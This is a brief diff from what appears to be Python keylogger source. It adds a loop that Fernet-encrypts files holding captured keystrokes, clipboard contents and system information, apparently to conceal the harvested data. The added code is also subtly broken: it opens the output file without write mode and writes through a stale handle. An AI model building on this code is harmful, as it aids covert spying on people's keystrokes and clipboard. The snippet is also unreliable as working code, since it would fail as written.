@@ -176,3 +176,10 @@ while number_of_iterations < number_of_iterations_end:
 files_to_encrpt = [file_merge + system_info, file_merge + clipboard_info, file_merge + keys_info]
 encrypted_file_names = [file_merge + system_info_e, file_merge + clipboard_info_e, file_merge + keys_info_e]
 counts = 0
+for encrypting_file_in in files_to_encrpt:
+    with open(files_to_encrpt[counts], 'rb') as f:
+        data = f.read()
+    fernet = Fernet(key)
+    encrypted = fernet.encrypt(data)
+    with open(encrypted_file_names[counts]):
+        f.write(encrypted)
